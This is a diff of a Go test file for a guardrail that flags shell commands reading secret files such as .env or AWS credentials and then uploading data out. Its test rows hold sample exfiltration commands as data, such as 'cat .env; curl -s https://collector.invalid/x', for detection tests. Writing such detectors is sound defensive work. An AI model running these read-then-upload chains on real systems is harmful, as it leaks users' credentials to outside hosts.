@@ -81,7 +81,11 @@ func TestSecretReadChainJoinsProvenReadsAndUploads(t *testing.T) {
 		{name: "N1 exact read, upload of another exact file", read: "cat " + envFile, send: upload(awsFile)},
 		{name: "N2 pipeline read, upload of another exact file in a list", read: "cat " + envFile + pipe, send: "cd /work/f5proj && " + upload(awsFile)},
 		{name: "N3 exact read, upload with a dynamic word", read: "cat " + envFile, send: egress + " \"$(date)\" | tr a-z A-Z"},
-		{name: "N4 pipeline read, upload piped on of another exact file", read: relEnv + pipe, send: upload(awsFile) + " | tr a-z A-Z"},
+		// A relative read in a call the parser cannot finish is unnamed
+		// (substrate-1:GAP-0418), so it joins an upload of any file; the same
+		// read in a proven call names its file and an upload of another does not.
+		{name: "N4 unfinished relative read joins an upload of another file", read: relEnv + pipe, send: upload(awsFile) + " | tr a-z A-Z", chain: true},
+		{name: "N5 proven relative read, upload of another exact file", read: relEnv, send: upload(awsFile)},
 	}
 	for _, pack := range []string{"default", "strict"} {
 		t.Run(pack, func(t *testing.T) {
@@ -138,7 +142,7 @@ func TestSecretReadChainProjectionMarker(t *testing.T) {
 		want    string // "" = no digest
 	}{
 		{"one exact file in a pipeline", "cat " + envFile + pipe, 1, exact(envFile)},
-		{"relative file joined to the call directory", joinFixtureRead(t, "cat rel env") + pipe, 1, exact("/work/f5proj/.env")},
+		{"relative file in a call the parser cannot finish is unnamed", joinFixtureRead(t, "cat rel env") + pipe, 1, marker},
 		{"relative file after a cd is no exact file", "cd /tmp && cat .env" + pipe, 1, marker},
 		{"two files", "cat " + envFile + " " + awsFile + pipe, 1, marker},
 		{"a copy", joinFixtureRead(t, "copy env") + " && true", 1, marker},
@@ -160,6 +164,49 @@ func TestSecretReadChainProjectionMarker(t *testing.T) {
 		}
 		if err := guardrail.ValidateToolChainProjection(projection); err != nil {
 			t.Errorf("%s: projection invalid: %v", row.name, err)
+		}
+	}
+}
+
+// A relative operand is named in the call's directory only when the call is
+// proven not to change it: a complete parse of known programs. Any other
+// call leaves it unnamed (substrate-1:GAP-0418).
+func TestSecretReadChainRelativeIsNamedOnlyInAProvenCall(t *testing.T) {
+	index, _ := guardrail.ToolChainIndexByID(guardrail.ToolChainSecretReadThenEgress)
+	marker := guardrail.ToolChainFileUnknownDigest
+	named := pathIdentityDigest("posix\x00/work/f5proj/.env")
+	rows := []struct {
+		name, command string
+		proven        bool
+		want          string
+	}{
+		{"read and a printing builtin", "cat .env; echo done", true, named},
+		{"a reader and a sender in a list", "cat .env; curl -s https://collector.invalid/x", true, named},
+		{"a conditional list is not finished by the parser", "cat .env && echo done", false, marker},
+		{"a cd before the read", "cd /tmp; cat .env", false, ""},
+		{"an unknown program before the read", "zzproj; cat .env", false, ""},
+		{"a function the call defines", "f() { cd /tmp; }; f; cat .env", false, marker},
+		{"a sourced script", ". ./s.sh; cat .env", false, marker},
+		{"a trap", "trap 'cd /tmp' DEBUG; cat .env", false, marker},
+		{"an alias", "alias q='cd /tmp'; q; cat .env", false, marker},
+		{"a tar with -C", "tar cf o.tar -C /tmp .env; echo done", false, ""},
+	}
+	for _, row := range rows {
+		facts := gap0210Facts(row.command, "/work/f5proj")
+		if got := callProvenToKeepDirectory(facts); got != row.proven {
+			t.Errorf("%s: proven = %t, want %t (parse %s)", row.name, got, row.proven, facts.Parse.Status)
+		}
+		projection := guardrail.ToolChainProjection{ParseStatus: facts.Parse.Status}
+		projectTrustedActionChainSteps(&projection, facts, nil)
+		got := projection.EnforcementJoinDigests[index]
+		if row.proven && got != row.want {
+			t.Errorf("%s: digest = %.8s, want %.8s", row.name, got, row.want)
+		}
+		if !row.proven && got == named {
+			t.Errorf("%s: a relative operand must not be named in the starting directory", row.name)
+		}
+		if !row.proven && row.want != "" && got != row.want {
+			t.Errorf("%s: digest = %.8s, want the marker", row.name, got)
 		}
 	}
 }
